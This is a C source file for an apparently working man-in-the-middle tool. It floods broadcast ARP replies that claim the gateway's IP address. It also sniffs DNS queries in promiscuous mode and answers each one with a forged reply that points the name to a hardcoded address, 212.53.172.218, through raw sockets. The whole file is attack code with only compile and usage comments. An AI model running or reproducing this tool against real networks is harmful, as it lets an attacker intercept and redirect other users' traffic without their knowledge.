/*
 * Compilation:  gcc -Wall ./spoof.c -o ./spoof -lnet -pthread -lpcap
 * Usage:        ./spoof
 * NOTE:         This program requires root privileges.
 */

#include <libnet.h>
#include <stdlib.h>
#include <pthread.h>
#include <pcap.h>
#include <sys/types.h>
#include <signal.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdlib.h>
#include <string.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

#define IP 6
#define UDP 17
#define	ETHTYPE_IP	0x0800		
#define ETHTYPE_ARP	0x0806		
#define FILTER "dst port 53"
/* 
Testing options

#define INTERFACE "ens33"
#define IP_DEST "212.53.172.218" //www.plemiona.pl
#define HOST_IP "192.168.188.230" //gateway ip
*/

char* errbuf;
pcap_t* handle;
int send_packets_count=0;

struct arguments{
  char *interface;
  char *dest_ip;
  char *host_ip;
};

struct dnshdr {
  char  id[2];
  char flags[2];
  char  qdcount[2];
  char  ancount[2];
  char  nscount[2];
  char  arcount[2];
};

struct dnsquery {
  char  *qname;
  char  qtype[2];
  char  qclass[2];
};

struct net_addr{
	u_int32_t src_ip;
	u_int32_t dst_ip;
	u_int16_t port;
};

void cleanup() {
  pcap_close(handle);
  free(errbuf);
}

void *arp_spoof(struct arguments *args)
{
  libnet_t *ln;
  u_int32_t target_ip_addr, zero_ip_addr;
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  struct libnet_ether_addr* src_hw_addr;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ln = libnet_init(LIBNET_LINK, args->interface, errbuf);
  src_hw_addr = libnet_get_hwaddr(ln);
  target_ip_addr = libnet_name2addr4(ln, args->host_ip , LIBNET_RESOLVE);
  zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  libnet_autobuild_arp(
    ARPOP_REPLY,                     /* operation type       */
    src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    (u_int8_t*) &target_ip_addr,     /* sender protocol addr */
    zero_hw_addr,                    /* target hardware addr */
    (u_int8_t*) &zero_ip_addr,       /* target protocol addr */
    ln);                             /* libnet context       */
  libnet_autobuild_ethernet(
    bcast_hw_addr,                   /* ethernet destination */
    ETHERTYPE_ARP,                   /* ethertype            */
    ln);                             /* libnet context       */
  while(1) 
  {
  libnet_write(ln);
  sleep(1);
  }

  libnet_destroy(ln);
}

void stop(int signo) {
  printf("Sent: %d dns responses. \n",send_packets_count);
  exit(EXIT_SUCCESS);
}


unsigned short calculate_checksum(unsigned short *buf, int nwords){
	unsigned long sum;
	for(sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

void build_datagram(char* datagram, unsigned int dns_size, struct net_addr naddr){
	struct ip *ip_hdr = (struct ip *) datagram;
	struct udphdr *udp_hdr = (struct udphdr *) (datagram + sizeof(struct ip));

	ip_hdr->ip_hl = 5;
	ip_hdr->ip_v = 4;
	ip_hdr-> ip_tos = 0;
	ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + dns_size;
	ip_hdr->ip_id = 0;
	ip_hdr->ip_off = 0;
	ip_hdr->ip_ttl = 255;
	ip_hdr->ip_p = 17;
	ip_hdr->ip_sum = 0;
	ip_hdr->ip_src.s_addr = naddr.dst_ip;
	ip_hdr->ip_dst.s_addr = naddr.src_ip;

	udp_hdr->source = htons(53);
	udp_hdr->dest = htons(naddr.port);
	udp_hdr->len = htons(sizeof(struct udphdr) + dns_size - 0x1C);
	udp_hdr->check = 0;

	ip_hdr->ip_sum = calculate_checksum((unsigned short *) datagram, ip_hdr->ip_len >> 1);
}
unsigned int create_answer(char *dest_ip, struct dnshdr *dns_hdr, char* dns_answer, char *dns_query){

  unsigned int size = 0;
  struct in_addr addr;
  inet_pton(AF_INET, "212.53.172.218", &addr);

	//header
	memcpy(&dns_answer[0], dns_hdr->id, 2);	//id
	memcpy(&dns_answer[2], "\x81\x80", 2);	//flags
	memcpy(&dns_answer[4], "\x00\x01", 2);	//qdcount
	memcpy(&dns_answer[6], "\x00\x01", 2);	//ancount
	memcpy(&dns_answer[8], "\x00\x00", 2);	//nscount
	memcpy(&dns_answer[10], "\x00\x00", 2);	//arcount
	//query
	size = strlen(dns_query) + 1;

	memcpy(&dns_answer[12], dns_query, size);	//qname
	size += 12;
	memcpy(&dns_answer[size], "\x00\x01", 2);	//type
	size += 2;
	memcpy(&dns_answer[size], "\x00\x01", 2);	//class
	size += 2;
	//answer

	memcpy(&dns_answer[size], "\xc0\x0c", 2);	//qname
	size += 2;
	memcpy(&dns_answer[size], "\x00\x01", 2);	//type
	size += 2;
	memcpy(&dns_answer[size], "\x00\x01", 2);	//class
	size += 2;
	memcpy(&dns_answer[size], "\x00\x00\x00\x22", 4);	//ttl
	size += 4;
	memcpy(&dns_answer[size], "\x00\x04", 2);	//rdata length
	size += 2;
	memcpy(&dns_answer[size], &addr, 4);	//rdata
	size += 4;
  size += 28; 
	return size;
  }

void send_answer(char* answer, struct net_addr naddr, unsigned int len){
	struct sockaddr_in saddr;
	int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int on = 1;
	
	if (sfd < 0){
		printf("Error creating socket\n");
		exit(-1);
	}
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(naddr.port);
	saddr.sin_addr.s_addr = naddr.src_ip;
	
	if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, (char*) &on, sizeof(on)) < 0){
		printf("Error setting socket\n");
		exit(-1);
	}

	if (sendto(sfd, answer, len, 0, (struct sockaddr *)&saddr, sizeof(saddr)) < 0){
		printf("Error sending answer");
		exit(-1);
	}
  send_packets_count++;
}
void trap(struct arguments *args, const struct pcap_pkthdr *h, const u_char *bytes) {
  char *qname;
	char* dns_answer;
	char* dest_ip = args->dest_ip;
  struct net_addr naddr;
  char udp_answer[8192];
  unsigned int answer_size;

  struct ip *iph = (struct ip*)(bytes +  sizeof(struct ethhdr));
  struct udphdr *udphd = (struct udphdr*)((char*)iph + sizeof(struct ip));
  struct dnshdr *dnshd = (struct dnshdr*)((char*) udphd + sizeof(struct udphdr));
  qname = ((char*) dnshd) + sizeof(struct dnshdr);
 
  memset(&naddr, 0, sizeof(struct net_addr)); 
  naddr.src_ip = iph->ip_src.s_addr;
  naddr.dst_ip = iph->ip_dst.s_addr;
  naddr.port = ntohs(udphd->uh_sport);
  
  dns_answer = udp_answer + sizeof(struct ip) + sizeof(struct udphdr);
  answer_size = create_answer(dest_ip, dnshd, dns_answer, qname);
  build_datagram(udp_answer, answer_size, naddr);
  send_answer(udp_answer, naddr, answer_size);
}
void *dns_pcap(struct arguments *args) {
  bpf_u_int32 netp, maskp;
  struct bpf_program fp;

  atexit(cleanup);
  signal(SIGINT, stop);
  errbuf = malloc(PCAP_ERRBUF_SIZE);
  handle = pcap_create(args->interface, errbuf);
  pcap_set_promisc(handle, 1);
  pcap_set_snaplen(handle, 65535);
  pcap_set_timeout(handle, 1000);
  pcap_activate(handle);
  pcap_lookupnet(args->interface, &netp, &maskp, errbuf);
  pcap_compile(handle, &fp, FILTER, 0, maskp);
  if (pcap_setfilter(handle, &fp) < 0) {
    pcap_perror(handle, "pcap_setfilter()");
    exit(EXIT_FAILURE);
  }
  pcap_loop(handle, -1, trap, args);
  return EXIT_SUCCESS;
}

int main(int argc, char** argv) {
  pthread_t thread1,thread2;
  struct arguments args;

  if (argc < 4)
  {
    printf("Program requires root privileges.\nUsage: %s INTERFACE HOST DEST_IP\n",argv[0]);
    return 0;
  }
  args.interface = argv[1];
  args.host_ip = argv[2];
  args.dest_ip = argv[3];
  pthread_create( &thread1, NULL, arp_spoof, &args);
  pthread_create( &thread2, NULL, dns_pcap, &args);

  pthread_join(thread1, NULL);
  pthread_join(thread2, NULL);
  return 0;
}
